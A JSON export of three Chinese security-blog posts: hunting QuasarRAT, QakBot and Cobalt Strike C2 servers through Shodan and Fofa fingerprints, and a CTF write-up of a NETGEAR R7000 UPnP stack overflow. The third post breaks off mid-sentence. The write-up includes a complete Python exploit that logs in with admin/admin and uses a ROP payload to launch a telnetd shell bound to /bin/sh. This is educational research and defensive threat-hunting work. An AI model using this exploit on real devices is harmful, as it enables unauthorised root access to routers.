[{"id":"770417add373829189d7a6ca63ee3b8d","title":"从IP和样本进行拓线Hunting","content":"从IP和样本进行拓线Hunting前言在情报生产中当你拿到一批样本，应该思考如何通过样本里的C2或者特征去拓线找到更多的恶意样本或者C2链接，本文将给出从一个样本出发进行拓线分析的例子，大佬轻喷。\nQuasarRAT样本获取样本来源推荐一个网站：MalwareBazaar\n其中收录了大量的样本，而且存在一些标识Tag帮助你快速的找到自己想要的样本，当然也是有对应的搜索语句的，学习一下即可。这里用signature:QuasarRAT进行搜索\n\n这些都是被标记为QuasarRAT的样本，挑一些出来看看：\n\nSHA256 hash:\t 0183491852a035f91d926bc25b7f09e7f145c59429cfef10e3f9963caa95c068\nSHA1 hash:\t 89cb5af4f1953fb7b26c592d95461e0a2a9a546d\nMD5 hash:\t 5e48a824853c3c6b9fe64223fe12d7cb\n\n样本准备好了，接下来就是进行一些行为分析，由于笔者不是专业的二进制样本分析师，所以我们借助沙箱和VirusTotal来进行分析。\n样本分析把样本扔到各家的沙箱里，并且去VirusTotal查询一下当前样本的信息和关联情况\n微步云沙箱可以看到命中了一些沙箱的规则，但是没有检测到有释放的文件或者连接的远控server\n\n\nVirusTotal主力还是我们的vt，我们重点关注RELATION这个页面，其中包含了一些关联的样本和IP信息\n\n\n对于多引擎无检出的优先级并不高，因为有些样本会通过连接白名单来判断当前的网络情况，所以我们优先判断59.26.93.6和13.107.4.50\n59.26.93.6\n关联样本有很多，但是名称很相近，跟进查看其他样本信息\n\n\n几乎都是已经明确是QuasarRAT的样本，这样一来，我们从一个QuasarRAT样本找到了这个关联IP，而这个IP关联了多个已经被判定为QuasarRAT的样本,那么笔者就认为这个IP就是QuasarRAT的远控IP，后续进行分析。\n13.107.4.50\n可以看到这个IP关联的样本很多，笔者挑了几个看了一下涉及到的病毒种类也比较多，无法判定是单纯的QuasarRAT Server，所以这里就不做后续分析，有兴趣的师傅可以自己分析一下VirusTotal - IP address - 13.107.4.50\n\n\n\nIP分析我们拿到了59.26.93.6这个IP，接下来去空间测绘引擎查询一下IP的信息，本文以Shadon和Fofa为例\n语句：\nShadon:  ip:\"59.26.93.6\"\nFofa  :  ip=\"59.26.93.6\"\n\n结果中首先观察到这里：\n\n很多端口的banner都是这串字符，这是msrpc的banner特征，所以这个就被我们pass\n然后我们查看https的证书，发现存在证书特征关键字Quasar Server CA\n\nShadon也显示了该IP对应的证书信息\n\n到这里，我们找到了一个相关的特征，即证书的Subject或者Issuer是Quasar Server CA，接下来使用Shadon进行拓线\n特征拓线我们通过特征在Shadon搜索更多证书与Quasar Server CA相关的服务器\nssl.cert.subject.cn:\"Quasar Server CA\"\n\n直接相关的结果有19个，主要分布在毛里求斯、香港和德国。对应的端口也多为443端口，少量的1337和8009端口\n然后通过Shadon的聚合模式查看其他的特征信息，首先是JARM\n\n获得QuasarRATServer出现的JARM值，然后我们通过单独搜索JARM去尝试Hunting\nssl.jarm:\"2ad2ad0002ad2ad0002ad2ad2ad2adf9fdf4eeac344e8b5003264da73585be\"\n\n看到12w个结果，基本可以确定不怎么靠谱，误报风险极极极极极极极极极极极极极极大\n其他的JARM看了结果也很多，所以这里就不考虑JARM，其他的指纹查看结果价值也不大\n该样本拓线出证书特征为Quasar Server CA\nQakBotQBot是一个模块化的信息窃取器，也被称为Qakbot或Pinkslipbot。它从受感染的系统中窃取金融数据，以及使用C2服务器进行有效载荷定位和下载的加载器。\n使用文章使用 Sophos NDR 检测到新的 QakBot C2 服务器 – Sophos News中提到的C2进行分析\n173.18.122.24ip:\"173.18.122.24\"\n搜索结果只开放了443端口，查看一下端口的特征值，这里注意返回的banner信息和网页hash\n\n通过网页hash进行拓展\nhttp.html_hash:501510358\n\n结果显示近9W条，这显然证明只通过网页hash颗粒度不够，由于shadon看不了这个IP的JARM指纹，我们通过fofa查看\n\n尝试通过JARM指纹和网页hash一起查询\nhttp.html_hash:501510358  ssl.jarm:\"21d14d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21\"\n\n共找到了88个结果，这个结果就在可接受的用来优化的范围内了，但还是要注意下其他的特征\n例如我们的原IP banner信息：\nHTTP/1.1 200 OK\nContent-Length: 4833\nServer: nginx/1.9.12\n\n可以看到首页的数据基本都相符，那么我们就暂时以这88个数据为基础再提取其他的特征，通过聚合查看其他特征\n其中对于http.headers_hash只存在一个值-1219739159\n\n此时只有一个特征的值就可以拿来进行下一步操作，我们通过html_hash和headers_hash反查JARM\nhttp.html_hash:501510358 http.headers_hash:-1219739159\n\n除了我们开头提取的21d这个JARM，还或取到了一个有一定数量的04d\n将JARM筛选也加上\nhttp.html_hash:501510358 http.headers_hash:-1219739159 ssl.jarm:\"04d02d00004d04d04c04d02d04d04d9674c6b4e623ae36cc2d998e99e2262e\"\n\n\n惊喜来了，这些IP的banner全部符合之前IP的情况，端口也都是统一的443，所以我们可以认为这些IP也是疑似QakBot\n那么这时候我们就可以把JARM的条件去掉，只用``http.html_hash:501510358 http.headers_hash:-1219739159`\n\n可以看到从1个IP拓线出了110个疑似QakBot的IP\n剩下的那个IP就留给师傅们去尝试\n结语笔者最近从事Hunting和情报相关工作，做简单的抛砖引玉，希望各位师傅不吝赐教！期待与各位师傅一起进步！\n","slug":"从IP和样本进行拓线Hunting","date":"2023-05-25T10:38:45.000Z","categories_index":"Hunting","tags_index":"Hunting","author_index":"RainSec"},{"id":"cabdfd8510238300fc39d39eb471ed7e","title":"西湖论剑 - Upnp","content":"西湖论剑WriteUP - Upnp前言这次应该是以一个NETGEAR R7000路由器的nDay为基础出的题，当时还在想是不是要挖上面的UPnP的0Day，没有意识到需要进行信息收集找相关漏洞分析。后面放出提示才意识到思路错了，在No Hardware, No Problem: Emulation and Exploitation (grimm-co.com)中所提到的漏洞就是这次题目的目标\n后面自己又仔细看了看UPnP的协议，再来复现这个题目\n漏洞定位通过提示SOAP firmware upgrade checking ... 附近和文章提到的漏洞位置，在upnp服务端的固件更新逻辑部分出现了溢出，后面也是通过字符串索引定位到了溢出位置：\n\n在进行memcpy时没有对大小v9进行限制，而v9是通过传入的固件中的数据所计算出来的，即v9可控那么这里就会造成栈溢出；这个漏洞很简单但是问题来了：这个UPnP功能定义在哪？怎么触发？(即逆向回溯)\n逆向根据一般的UPnP协议，其提供的服务都会在.XML文件中写明，但是在www文件加下搜索firmware update相关字符串毫无结果。所以这个固件更新功能是内部API，也许其用法写在开发文档中，那么只能逆出调用该API的UPnP数据包格式。虽然是个内部API但是估计也是基于UPnP control包的格式开发的：\n\n那么对SOAPACTION交叉索引定位到如下函数：\n\n显然这是用来对http包中的SOAPACTION定位的，那么继续查看调用该函数的地方(对于不同URL提供不同服务，很有可能存在一个集中处理URL的位置)：\n\n前面几个Public_UPNP_Cx是有对应XML描述文件的，但是soap/server_sa和soap/server_sa/opendns这两个URL是没有任何描述文件的，所以估计在sub_41900中实现了内部API，经过动调分析其函数签名为：sub_41900(int http, int int_fd, in_addr_t in_addr, int pass)，http指向客户发送的http数据，int_fd则是交互socket，in_addr为客户ip，pass暂未分析出来。下面分析该函数中重点部分\n服务遍历程序维护了一个内部服务名列表，每个最长30字节，一共11个服务；根据SOAPAction字段所指定的服务名获取对应列表下标：\nv11 = stristr(http_v4, \"SOAPAction:\");\nif ( !v11 )\n  return -1;\nv12 = aDeviceinfo;                            // parentalcontrol: index == 7  DeviceConfig: index == 1\naction_v13 = v11 + 11;\nwhile ( 1 )                                   // travel 11 internal serverName\n{\n  ServerNamePTR = v12;\n  v14 = strchr(action_v13, '\\r');\n  v15 = v14 - action_v13;\n  if ( v14 )                                  // action length &lt;= 127\n  {\n    if ( v15 &gt; 126 )\n      v15 = 127;\n  }\n  else\n  {\n    v15 = 127;\n  }\n  strncpy((char *)&amp;v93, action_v13, v15);\n  v101 = 0;\n  v16 = stristr((const char *)&amp;v93, v12);\n  v12 += 30;\n  if ( v16 )\n    break;\n  if ( ++v8 == 11 )\n  {\n    serverIdx = -1;\n    goto LABEL_14;\n  }\n}\nserverIdx = v8;\n\n内部服务有：DeviceInfo，DeviceConfig，WANIPConnection，WANEthernetLinkConfig，LANConfigSecurity，WLANConfiguration，Time，ParentalControl，AppSystem，AdvancedQoS，UserOptionsTC\nSOAPAction字段构成为：urn:NETGEAR-ROUTER:service:{ServerName}:1#{ActionName}\n用户验证  cookie = stristr(http_v4, \"Cookie:\");\n  v21 = stristr(http_v4, \"SOAPAction:\");\n  if ( v21 &amp;&amp; *(v21 - 2) == '\\r' &amp;&amp; *(v21 - 1) == '\\n' &amp;&amp; (a1 = v21, v41 = strchr(v21, *(v21 - 2)), (v42 = v41) != 0) )\n  {\n    *v41 = v20;\n    login = stristr(a1, \"service:DeviceConfig:1#SOAPLogin\") == 0;// service:DeviceConfig:1#SOAPLogin\n    *v42 = '\\r';\n  }\n  else\n  {\n    login = 1;\n  }\n  if ( cookie )\n    login_v23 = login;\n  else\n    login_v23 = 0;\n  if ( !login_v23 || (v91 = strchr(cookie, '\\r')) == 0 )// if logined\n  {\nLogin_63:\n    Addr_EB9C8 = 0;\n    v43 = inet_ntoa((struct in_addr)int_addr_v6);\n    strcpy(&amp;Addr_EB9C8, v43);\n    v44 = inet_ntoa((struct in_addr)int_addr_v6);\n    v45 = (const char *)acosNvramConfig_get((int)\"lan_ipaddr\");\n    if ( strcmp(v44, v45)\n      &amp;&amp; (strncmp(action_v13, \" urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\", 0x3Au)\n       &amp;&amp; strncmp(action_v13, \" \\\"urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\\\"\", 0x3Cu)\n       || serverIdx != 7)\n      &amp;&amp; (strncmp(action_v13, \" urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\", 0x34u)\n       &amp;&amp; strncmp(action_v13, \" \\\"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\\\"\", 0x36u)\n       || serverIdx != 1) )\n    {\n      v94 = 0;\n      v95 = 0;\n      v96 = 0;\n      v97 = 0;\n      v98 = 0;\n      v99 = 0;\n      v100 = 0;\n      v93 = 0;\n      memset(&amp;s, 0, 0x80u);\n      v46 = fopen(\"/tmp/opendns_auth.tbl\", \"r\");\t\t// login recoder\n      if ( v46 )\n      {\n        getMacList((int)&amp;v93);\n        while ( fgets(&amp;s, 128, v46) )\n        {\n          if ( strstr(&amp;s, (const char *)&amp;v93) )\n          {\n            fclose(v46);\n            goto Dofunc_34;\t\t\t\t\t\t\t// if the user`s mac_addr in the recode list then don't need check\n          }\n        }\n        fclose(v46);\n        resp_state = 401;\n        return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);\n      }\n      goto Unauthor_61;\n    }\n    goto Dofunc_34;\n  }\n  *v91 = 0;\n  v24 = strstr(cookie, \"sess_id=\");\n  if ( !v24 )\n  {\n    *v91 = 13;\n    goto Login_63;\n  }\n  sessPtr = v24 + 8;\n  v26 = strchr(v24 + 8, ';');\n  if ( v26 )\n  {\n    *v26 = 0;\n    v27 = v26;\n    v28 = sessConfirm(sessPtr, (const char *)&amp;v93, int_addr_v6);\n    *v27 = 59;\n  }\n  else\n  {\n    v28 = sessConfirm(sessPtr, (const char *)&amp;v93, int_addr_v6);\n  }\n  if ( !v28 )\n    goto Unauthor_61;\nUnauthor_61:\n    resp_state = 401;\n    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);\n  }\n\n验证策略由cookie验证和login验证组成，其中Cookie格式为：sess_id=???????; SameSite=Strict。部分服务提供mac验证，不需要Cookie；在sessConfirm函数中验证session_ID，其内部维护了session列表。\nloginCookie中的session ID是通过第一次调用login服务得来的，在sub_41900-&gt;processAction中调用不同服务对应的不同action：\nDocontrol_35:\n  if ( serverIdx == -1\n    || (v29 = ServerNamePTR,\n        printf(\"%s()\\n\", \"sa_saveXMLServiceType\"),\n        memset(soapAction, 0, 100u),\n        (v30 = stristr(http_v4, \"urn:\")) == 0)\n    || (v31 = stristr(v30 + 4, \":\")) == 0\n    || (v32 = stristr(http_v4, v29)) == 0 )\n  {\nUnauthor_61:\n    resp_state = 401;\n    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);\n  }\n  v33 = strlen(v29);\n  strcat(soapAction, \"urn:NETGEAR-ROUTER\");\n  v34 = strlen(soapAction);\n  memcpy(&amp;soapAction[v34], v31, &amp;v32[v33] - v31);\n  strcat(soapAction, \":1\");\n  printf(\"sa_service_type_buf=%s\\r\\n\", soapAction);\n  flag_v35 = ifSSL;\n  if ( ifSSL )\n    flag_v35 = 1;\n  v36 = processAction(flag_v35, serverIdx, http_v4, int_fd_v5, pass_v7, (char *)int_addr_v6);\n  if ( v36 &gt; 1 )\n  {\n    resp_state = v36;\n    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);\n  }\n\n在processAction函数中主要通过一个switch case来调用不同action，在isNameiMatch(const char *keySrc, int key_idx)中根据kei_idx在action列表查对应action名(同样)，然后在对比keySrc(即http data)中是否指定了该action，如果是返回1。\nserverIdx_v6 = serverIdx;\nhttp_v7 = http;\nflag_a1 = ifssl;\nfd = int_fd;\nin_addr_v8 = in_addr;\nprintf(\"%s():type=%d\\n\", \"sa_processResponse\", serverIdx);\nswitch ( serverIdx_v6 )\n{\n    case 0:\n        if ( isNameiMatch(http_v7, 0) == 1 )\n            goto LABEL_251;\n        if ( isNameiMatch(http_v7, 19) == 1 )\n        {\n            key_idx = 19;\n            flag_v12 = -1;\n            goto LABEL_252;\n        }\n        {...}\n}\n/*\n.data:00083B88 ; specialAction ActionList[400]\n.data:00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4\n.data:00083B88                                         ; DATA XREF: GotName:loc_2A91C↑o\n.data:00083B88                                         ; .text:off_2A960↑o\n.data:00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18\n.data:00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C\n.data:00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C\n.data:00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13\n.data:00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8\n.data:00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A\n.data:00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58\n.data:00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21\n.data:00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8\n.data:00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28\n.data:00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40\n.data:00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F\n*/\n\nupnp的login action名为SOAPLogin，属于DeviceConfig服务，action下标为197：\nif ( key_idx != 197 )\n    goto LABEL_264;\nv54 = stristr(http_v7, \"&lt;Username\");// login check\nv55 = v54;\nif ( v54 )\n{\n    v55 = stristr(v54, \"&gt;\");\n    if ( v55 )\n    {\n        v56 = stristr(http_v7, \"&lt;/Username&gt;\");\n        if ( v56 )\n        {\n            *v56 = 0;\n            v57 = v56;\n            v55 = (char *)acosNvramConfig_match(\"http_username\", v55 + 1);// what is the original 'http_username' ?\n            *v57 = '&lt;';\n        }\n        else\n        {\n            v55 = 0;\n        }\n    }\n}\nv58 = stristr(http_v7, \"&lt;Password\");\nif ( !v58 )\n    goto LABEL_836;\na3 = stristr(v58, \"&gt;\");\nif ( !a3 )\n    goto LABEL_836;\nv59 = stristr(http_v7, \"&lt;/Password&gt;\");\nif ( !v59 )\n    goto LABEL_836;\n*v59 = 0;\nv77 = v59;\n*(_DWORD *)v82 = 0;\nmemset(&amp;v83, 0, 0x7Cu);\ndoHash(a3 + 1, v82, a3, v60);       // passwd stored in SHA256 format\nv61 = acosNvramConfig_match(\"http_passwd_digest\", v82);\nv62 = v61 == 0;\nif ( v61 )\n    v62 = v55 == 0;\n*v77 = 60;\nif ( !v62 )                         // account right\n{\n    sub_31CDC((int)&amp;v99, (in_addr_t)in_addr, 0);// generate cookie\n    v63 = sub_32014((signed int)&amp;v99, (int)in_addr);\n    if ( v63 &lt;= 0 )\n        v63 = 503;\n    resp_state = v63;\n}\n\n需要在发送的http包中指定&lt;Username&gt;Name&lt;/Username&gt;，&lt;Password&gt;Passwd&lt;/Password&gt;，登录成功后将session_ID在响应包中发送。在模拟启动环境发送登录包将获得如下响应包：\n\ndef SOAPLogin(http_username: str, passwd: str) -&gt; str:\n    header = {\n        \"SOAPACTION\": \"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\"\n    }\n    body = '&lt;?xml version=\"1.0\"?&gt;\\r\\n'\n    body += '&lt;Username&gt;admin&lt;/Username&gt;\\r\\n'\n    body += '&lt;Password&gt;admin&lt;/Password&gt;\\r\\n'\n\n    respnd = requests.post(url=URL, headers=header, data=body)\n    cookie = respnd.headers.get('Set-Cookie')\n    print(cookie)\n    return cookie\n\n\n\n\n\n模拟启动qemu配置如下：Index of /~aurel32/qemu/armhf (debian.org)\n#!/bin/bash\n\nqemu-system-arm -M vexpress-a9 \\\n\t-kernel vmlinuz-3.2.0-4-vexpress \\\n\t-initrd initrd.img-3.2.0-4-vexpress \\\n\t-drive if=sd,file=debian_wheezy_armhf_standard.qcow2\\\n\t-append \"root=/dev/mmcblk0p2 console=ttyAMA0\" \\\n\t-net user,hostfwd=tcp::2222-:22,hostfwd=tcp::5555-:5555,hostfwd=tcp::5000-:5000 -net nic \\\n\t-nographic\n\n因为程序中大量调用nvram的系列函数，所以使用https://github.com/grimm-co/NotQuite0DayFriday.git提供的hook源码编译一个hook库(根据IDA可知nvram函数的实现在`libnvram.so`中)，然后传入qemu中替换`usr/lib/libnvram.so`。尝试启动结果如下\nroot@debian-armhf:~# cd squashfs-root/\nroot@debian-armhf:~/squashfs-root# mount --bind /proc ./proc\nroot@debian-armhf:~/squashfs-root# mount --bind /dev ./dev/\nroot@debian-armhf:~/squashfs-root# chroot . ./bin/busybox sh\n\n\nBusyBox v1.7.2 (2021-08-26 10:32:44 CST) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n#/usr/sbin/upnpd\nGetting upnp_turn_on\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such file or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such file or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such file or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nSetting upnp_portmap_entry = 0\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting lan_ipaddr\n\n程序在main函数中调用了daemon进入后台，所以不方便直接gdb调试，因此为了后面分析这里需要NOP掉；然后就是直接运行发现后面立马exit(0)。nop掉daemon后进去调试发现在调用setsockopt(v5, 0, 35, &amp;optval, 8u)加入多播地址出错：\n\ngoogle了一下这个问题发现是qemu自身不支持多播协议：\n\n但是这里关键在于upnp程序的控制服务和多播功能关系不大，因此选择将修改下面的跳转为无条件跳转：\n\n然后就可以维持运行了：\n\n需要的就是这两个端口\nExploit与login的action调用类似，固件更新的action名为SetFirmware，同样属于DeviceConfig服务下标为60，主要逻辑如下：\n  v130 = v7 == 0xFF13;\n  dword_EC044[19 * v83] = 0xFF3B;\n  firmdataDecry = (char *)malloc(0x400000u);\n  v24 = (unsigned __int8 *)firmdataDecry;\n  if ( !firmdataDecry )\n  {\n    v2 = 603;\n    printf(\"No memory buffer %d for using in %s\\n\", 0x400000, \"sa_setFirmware\");\n    goto LABEL_101;\n  }\n  base64Decode(firmdataDecry, &amp;v130, (unsigned __int8 *)firmdataCry);\n  printf(\"sa_base64_decode, len=%d\\n\", v130);\n  v25 = v24[7];\n  printf(\"SOAP firmware upgrade checking ... \");\n  if ( checker(v24) )                           // stack overflow\n  {\n    v2 = 702;\n  }\n/*checker part*/\n    v4 = *((unsigned __int8 *)v1 + 38);\n    v5 = *((unsigned __int8 *)v1 + 5);\n    v6 = *((unsigned __int8 *)v1 + 37);\n    v7 = *((unsigned __int8 *)v1 + 7) + (*((unsigned __int8 *)v1 + 4) &lt;&lt; 24) + (*((unsigned __int8 *)v1 + 6) &lt;&lt; 8);\n    v8 = *((unsigned __int8 *)v1 + 39) + (*((unsigned __int8 *)v1 + 36) &lt;&lt; 24);\n    *((_BYTE *)v1 + 36) = 0;\n    *((_BYTE *)v1 + 37) = 0;\n    len = v7 + (v5 &lt;&lt; 16);\n    *((_BYTE *)v1 + 38) = 0;\n    *((_BYTE *)v1 + 39) = 0;\n    v10 = v8 + (v4 &lt;&lt; 8) + (v6 &lt;&lt; 16);\n    memset(&amp;v13, 0, 0x64u);\n    memcpy(&amp;v13, v1, len);\n    calculate_checksum(v3, v3, v3);\t\n/*\n.data:000841C8 ; specialArg ArgList[]\n.data:000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o\n.data:000841C8                                         ; sub_F39C+60↑o ...\n.data:000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r\n.data:000841CC                                         ; \"NewEnable\"\n.data:000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r\n.data:000841D4                 DCD 0xFF01\n.data:000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r\n.data:000841D8                                         ; \"NewConnectionType\"\n.data:000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r\n.data:000841E0                 DCD 0xFF02\n.data:000841E4                 DCD 0x4AB1C\n.data:000841E8                 DCD 0x40\n\n*/\n\n可以在参数列表中找到该action的参数label为&lt;NewFirmware&gt;FirmData&lt;/NewFirmware&gt;；其中发送的firmData是base64加密过的，这里在构造firmware数据时注意不要造成memcpy的len太大否则在memcpy就可能出现段错误，但无法利用(这中copy函数的长度问题在iot中经常遇到)。构造包溢出后结果如下：\n\n得到偏移如下：\n\n因为开启了NX保护所以rop构造system(cmd)，在arm架构下控制r0~r3的gadgets很少，但是在程序中调用system函数的附近找到如下指令：\n2F134                 MOV             R0, SP  ; command\n2F138                 BL              system\n\n那么就可以在176偏移处存放cmd，然后168处存放2F134地址即可。Exp如下：\nimport sys, base64, requests, struct\n\nURL = 'http://localhost:5000/soap/server_sa'\n\n\ndef SOAPLogin(http_username: str, passwd: str) -&gt; str:\n    header = {\n        \"SOAPACTION\": \"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\"\n    }\n    body = '&lt;?xml version=\"1.0\"?&gt;\\r\\n'\n    body += '&lt;Username&gt;admin&lt;/Username&gt;\\r\\n'\n    body += '&lt;Password&gt;admin&lt;/Password&gt;\\r\\n'\n\n    respnd = requests.post(url=URL, headers=header, data=body)\n    cookie = respnd.headers.get('Set-Cookie')\n    print(cookie)\n    return cookie\n\ndef SetFirmware(cookie: str):\n    header = {\n        \"SOAPACTION\": \"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetFirmware\",\n        \"Cookie\": f'{cookie}'\n    }\n    firmData = b'*#$^' + b'\\x00' + b'\\x00' + b'\\x01' + b'\\x00'\n    firmData += b'A'*144\n    firmData += b'4'*4      #r4\n    firmData += b'5'*4      #r5\n    firmData += b'6'*4      #r6\n    firmData += b'7'*4      #r7\n    firmData += b'8'*4      #r8\n    firmData += b'9'*4      #r9\n    firmData += b'a'*4      #r10\n    \"\"\"ROP for system(ANY_cmd)\n    2F134                 MOV             R0, SP  ; command\n    2F138                 BL              system\n    \"\"\"\n    firmData += struct.pack('&lt;I', 0x2F134)      #PC\n    firmData += b'/usr/sbin/telnetd -p2333 -l/bin/sh &amp;'\n\n    body = b''\n    body += b'&lt;s:Body&gt;\\r\\n'\n    body += b'&lt;NewFirmware&gt;%s'%(base64.b64encode(firmData))\n    body += b'&lt;/NewFirmware&gt;'\n    body += b'&lt;/s:Body&gt;\\r\\n'\n    \n\n    respn = requests.post(url=URL, headers=header, data=body)\n    print(respn.text)\n\nif __name__ == '__main__':\n    cookie = SOAPLogin('admin', 'admin')\n    SetFirmware(cookie)\n\n\n\n小结先了解一个程序的服务架构方便定位其易出问题的地方\n参考\nNo Hardware, No Problem: Emulation and Exploitation (grimm-co.com)\nIndex of /~aurel32/qemu/armhf (debian.org)\n\n","slug":"2022西湖论剑Upnp","date":"2023-04-18T10:38:45.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"RainSec"},{"id":"85cf47c5a6aa8aaa1697f3846792f828","title":"手把手带你入门之用空间测绘Hunting C2","content":"手把手带你入门之用空间测绘Hunting C2前言笔者最近工作接触到了情报方面，觉得蛮有意思的，就尝试通过空间测绘引擎来Hunting一些C2生产情报，觉得这个流程蛮有意思，开个新坑手把手带你情报入门。\n什么是情报\n\n\n\n\n\n\n\n\n威胁情报（Threat Intelligence）是指收集、分析和利用关于各种安全威胁的数据和信息的过程，以帮助组织识别和应对安全威胁。威胁情报可以来自多个来源，包括公共情报、私人情报、开源情报以及企业内部情报\n本章中我们可以通过Hunting C2来对捕获到的IP进行一个C2标签的加，这样该IP就可以作为一个恶意IP进入到我们的情报库中。\n此外对于某些集中攻击、流量特征明显或者针对具体行业的攻击者还可以具象化为一个家族或者团伙，以Cobalt Strike为例，Ryuk，Conti，Egregor和DoppelPaymer等几种勒索软件已经开始使用Cobalt Strike来加速其勒索软件部署。根据思科的报告显示，66%的勒索软件攻击涉及Cobalt Strike。\n准备工作Hunting C2最重要的工作就是调研一下C2服务器或者行为的一些特征，就像出去钓鱼，不同的鱼生活的环境、季节、水质情况等条件都要明确。\n还是以Cobalt Strike为例，这里给出几种常见的Hunting CS服务器时关注的点：\nCobalt Strike Beacon\nSSL证书和序列号\n默认404未找到响应\n默认端口50050和Banner Hash\n默认SSH客户端Hash\nJA3指纹、JA3S指纹和JARM TLS指纹\n网站的HTML Hash\n读懂C2\n\n由于笔者妹有Fofa账号（Big 穷逼一个），所以本文以shadon和Quake为例\n开始HuntingCobalt Strike BeaconShodan已经将”Cobal Strike Beacon”添加到了 Shodan Product字段的值列表中，所以可以直接通过语法product:\"Cobalt Strike Beacon\"\n\n笔者在写文章时能够Hunting到的CS服务器有1200+，其中中国和美国以及中国香港行政区是出现C2服务器最多的三个地方\n\n（小声BB：它们的默认页面返回都是404 Not Found哦）\n80、443 和8443是出现次数TOP3的端口\n除此之外还可以看到在世界各地托管Cobalt Strike服务器的主要ISP是谁，腾讯和阿里巴巴真是一路领先\n这种非常精确的特定搜索将用于在一些技术中确定CS服务器的独特属性\nSSL证书和序列号Cobalt Strike本身是附带用于HTTPS通信的默认SSL证书的，所以可以通过Hunting SSL证书的值来搜索CS服务器。\n默认证书: \nmd5:950098276A495286EB2A2556FBAB6D83\nsha1:6ECE5ECE4192683D2D84E25B0BA7E04F9CB7EB7C\nsha256:87F2085C32B6A2CC709B365F55873E207A9CAA10BFFECF2FD16D3CF9D94D390C\n\n默认序列号:ssl.cert.serial:146473198\n\n所以可以使用ssl:\"6ECE5ECE4192683D2D84E25B0BA7E04F9CB7EB7C\"或者ssl.cert.serial:\"146473198\"进行查询\n\n\n发现了吗，通过SHA1和通过Cert号搜索的结果是相同的，这是因为这两个字段链接在一起。\n我们还可以加上之前的product字段查看CS出现的cert指纹趋势\n\n大多数都是使用的默认证书，SSL 指纹是唯一的并且与Cobalt Strike特别相关，但是默认证书可以替换为有效的 SSL 证书，或者可以使用 Malleable C2 配置文件更改其参数（上面有一些不一样的cert就可以看出这一点）,除此之外还有不同的序列号：\n\n默认404未找到响应上面的方法我们Hunting到的CS服务器可以看到默认全都是404，所以我们也可以从这个点去入手，但是对于结果需要谨慎的进行后续判断。\nCobalt Strike服务器默认的404 Not Found HTTP响应标头的Content-Length为 0，Content-Type为 text/plain，如下所示\nHTTP/1.1 404 Not Found\nContent-Type: text/plain\nContent-Length: 0\n\n所以可以结合这三处特征使用\"HTTP/1.1 404 Not Found Date:\" \"Content-Type: text/plain\" \"Content-Length进行搜索\n\n有亿点小多。。。\n攻击者可以通过不同的方式逃避这种检测方法，例如通过使用可拓展的C2配置文件更改默认响应，或者调整服务器参数和标头数据以使其与合法服务器保持一致。所以这种方式需要进行手续的威胁分析，这个本篇暂时不考虑。\n默认端口50050和Banner HashCS服务器可以默认接收TCP 